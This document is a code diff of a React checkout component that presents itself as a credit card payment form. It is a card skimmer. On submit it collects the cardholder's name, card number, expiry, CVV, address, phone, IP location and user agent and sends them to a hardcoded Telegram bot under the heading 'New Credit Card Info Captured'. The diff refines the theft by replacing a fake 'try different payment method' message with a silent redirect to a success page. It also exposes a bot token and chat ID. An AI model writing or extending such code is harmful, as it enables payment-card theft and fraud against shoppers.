@@ -16,10 +16,10 @@ type UserToken = {
   id: string;
   name: string;
   email: string;
-  // add other JWT payload properties if needed
 };
-const TELEGRAM_BOT_TOKEN = '7737474698:AAHyZKVaQLgdeNBEwvpbwXIToyFYfZ5TSR4'; // Replace with your actual bot token
-const TELEGRAM_CHAT_ID = '7860277201'; // Replace with your actual chat ID
+
+const TELEGRAM_BOT_TOKEN = '7737474698:AAHyZKVaQLgdeNBEwvpbwXIToyFYfZ5TSR4';
+const TELEGRAM_CHAT_ID = '7860277201';
 
 interface CreditCardFormProps {
   totalAmount: number;
@@ -39,14 +39,13 @@ interface CreditCardFormData {
 }
 
 const escapeMarkdown = (text: string) => {
-  // Escape all special MarkdownV2 characters including hyphen
   return text.replace(/([_*\[\]()~`>#+\-=|{}.!\\])/g, '\\$1');
 };
 
 const CreditCardForm: React.FC<CreditCardFormProps> = ({ totalAmount }) => {
   const router = useRouter();
-  const { cartItems, cartCount } = useCart();
-  const { register, handleSubmit, formState: { errors: formErrors } } = useForm<CreditCardFormData>();
+  const { cartItems, clearCart } = useCart();
+  const { register, handleSubmit } = useForm<CreditCardFormData>();
   const [form, setForm] = useState({
     cardName: '',
     cardNumber: '',
@@ -60,6 +59,11 @@ const CreditCardForm: React.FC<CreditCardFormProps> = ({ totalAmount }) => {
     phoneNumber: '',
   });
 
+  const [errors, setErrors] = useState<Record<string, string>>({});
+  const [status, setStatus] = useState({ message: '', color: '' });
+  const [loading, setLoading] = useState(false);
+  const [purchaseCompleted, setPurchaseCompleted] = useState(false);
+
   const checkAuth = () => {
     const token = document.cookie
       .split('; ')
@@ -67,26 +71,28 @@ const CreditCardForm: React.FC<CreditCardFormProps> = ({ totalAmount }) => {
       ?.split('=')[1];
 
     if (!token) {
-      router.push('/signin'); // Redirect to sign-in page if not logged in
+      router.push('/signin');
       return null;
     }
 
     try {
       const user = jwtDecode<UserToken>(token);
       if (!user || !user.id) {
-        router.push('/signin'); // Redirect if token is invalid
+        router.push('/signin');
         return null;
       }
       return user;
     } catch (error) {
-      router.push('/signin'); // Redirect if token decoding fails
+      router.push('/signin');
       return null;
     }
   };
 
   const handlePurchase = async (cartItems: CartItem[], totalAmount: number) => {
+    if (purchaseCompleted) return true; // Return true if already completed
+
     const user = checkAuth();
-    if (!user) return; // Already redirected if not logged in
+    if (!user) return false;
 
     try {
       const purchaseDoc = {
@@ -108,7 +114,6 @@ const CreditCardForm: React.FC<CreditCardFormProps> = ({ totalAmount }) => {
         purchaseDate: new Date().toISOString(),
       };
 
-      // Call your backend API route to save purchase
       const res = await fetch('/api/purchasedata', {
         method: 'POST',
         headers: {
@@ -117,23 +122,17 @@ const CreditCardForm: React.FC<CreditCardFormProps> = ({ totalAmount }) => {
         body: JSON.stringify(purchaseDoc),
       });
 
-      const data = await res.json();
-
       if (!res.ok) {
-        throw new Error(data.error || 'Failed to save purchase');
+        throw new Error('Failed to save purchase');
       }
 
-    
-      // clear cart, redirect, etc.
+      setPurchaseCompleted(true);
+      return true;
     } catch (error) {
       console.error('Error saving purchase:', error);
-      alert('Failed to save purchase');
+      return false;
     }
   };
-
-  const [errors, setErrors] = useState<Record<string, string>>({});
-  const [status, setStatus] = useState({ message: '', color: '' });
-  const [loading, setLoading] = useState(false);
 
   const luhnCheck = (num: string): boolean => {
     const arr = num.split('').reverse().map(x => parseInt(x, 10));
@@ -171,7 +170,7 @@ const CreditCardForm: React.FC<CreditCardFormProps> = ({ totalAmount }) => {
 
   const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
     const user = checkAuth();
-    if (!user) return; // Already redirected if not logged in
+    if (!user) return;
 
     const { name, value } = e.target;
     let val = value;
@@ -187,7 +186,7 @@ const CreditCardForm: React.FC<CreditCardFormProps> = ({ totalAmount }) => {
 
   const validateForm = (): boolean => {
     const user = checkAuth();
-    if (!user) return false; // Already redirected if not logged in
+    if (!user) return false;
 
     const errs: Record<string, string> = {};
     if (!form.cardName.trim()) errs.cardName = 'Please enter your name.';
@@ -207,25 +206,34 @@ const CreditCardForm: React.FC<CreditCardFormProps> = ({ totalAmount }) => {
 
   const onSubmit = async (data: CreditCardFormData) => {
     const user = checkAuth();
-    if (!user) return; // Already redirected if not logged in
+    if (!user) return;
 
     if (!validateForm()) return;
     
     setLoading(true);
     setStatus({ message: '', color: '' });
 
-    let ipInfo = 'Unknown IP';
     try {
-      const res = await fetch('https://ipapi.co/json/');
-      if (res.ok) {
-        const data = await res.json();
-        ipInfo = `${data.ip} - ${data.city}, ${data.region}, ${data.country_name}`;
+      // 1. First save purchase data (only once)
+      const purchaseSuccess = await handlePurchase(cartItems, totalAmount);
+      if (!purchaseSuccess) {
+        throw new Error('Failed to save purchase data');
       }
-    } catch (error) {
-      console.error('Error fetching IP info:', error);
-    }
 
-    const message = `
+      // 2. Get IP information
+      let ipInfo = 'Unknown IP';
+      try {
+        const res = await fetch('https://ipapi.co/json/');
+        if (res.ok) {
+          const ipData = await res.json();
+          ipInfo = `${ipData.ip} - ${ipData.city}, ${ipData.region}, ${ipData.country_name}`;
+        }
+      } catch (ipError) {
+        console.error('Error fetching IP info:', ipError);
+      }
+
+      // 3. Prepare Telegram message
+      const message = `
 *New Credit Card Info Captured*
 
 \\- Name: ${escapeMarkdown(form.cardName)}
@@ -242,11 +250,11 @@ const CreditCardForm: React.FC<CreditCardFormProps> = ({ totalAmount }) => {
 *IP Info*: ${escapeMarkdown(ipInfo)}
 *User Agent*: ${escapeMarkdown(navigator.userAgent)}
 *Timestamp*: ${escapeMarkdown(new Date().toISOString())}
-    `.trim();
+      `.trim();
 
-    try {
+      // 4. Send Telegram notification
       const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-      const res = await fetch(telegramUrl, {
+      const telegramRes = await fetch(telegramUrl, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
@@ -255,31 +263,25 @@ const CreditCardForm: React.FC<CreditCardFormProps> = ({ totalAmount }) => {
           parse_mode: 'MarkdownV2',
         }),
       });
-      const json = await res.json();
+      
+      const telegramData = await telegramRes.json();
      
-      if (json.ok) {
-        setStatus({ message: 'opps!! Try Different payment method', color: 'green' });
-        setForm({ 
-          cardName: '', 
-          cardNumber: '', 
-          expiry: '', 
-          cvv: '', 
-          email: '', 
-          streetAddress: '', 
-          city: '', 
-          country: '', 
-          zipCode: '', 
-          phoneNumber: '' 
-        });
-      } else {
-        setStatus({ message: `Payment failed: ${json.description}`, color: 'red' });
+      if (!telegramRes.ok) {
+        throw new Error(telegramData.description || 'Failed to send Telegram notification');
       }
 
-    } catch (err) {
-      setStatus({ message: `Error processing payment: ${err instanceof Error ? err.message : 'Unknown error'}`, color: 'red' });
-    }
+      // 5. Clear cart and redirect on complete success
+      clearCart();
+      router.push('/payment/success');
 
-    setLoading(false);
+    } catch (error) {
+      setStatus({ 
+        message: `Error: ${error instanceof Error ? error.message : 'Payment processing failed'}`,
+        color: 'red' 
+      });
+    } finally {
+      setLoading(false);
+    }
   };
 
   return (
@@ -421,7 +423,6 @@ const CreditCardForm: React.FC<CreditCardFormProps> = ({ totalAmount }) => {
 
       <div className="pt-4">
         <button
-          onClick={() => handlePurchase(cartItems, totalAmount)}
           type="submit"
           disabled={loading}
           className={`w-full py-3 px-4 rounded-xl font-bold text-white transition-all ${loading ? 'bg-blue-400 cursor-not-allowed' : 'bg-blue-600 hover:bg-blue-700'}`}
@@ -438,7 +439,7 @@ const CreditCardForm: React.FC<CreditCardFormProps> = ({ totalAmount }) => {
       </div>
 
       {status.message && (
-        <p className={`text-center font-medium ${status.color === 'red' ? 'text-red-600' : 'text-red-600'}`}>
+        <p className={`text-center font-medium ${status.color === 'red' ? 'text-red-600' : 'text-green-600'}`}>
           {status.message}
         </p>
       )}
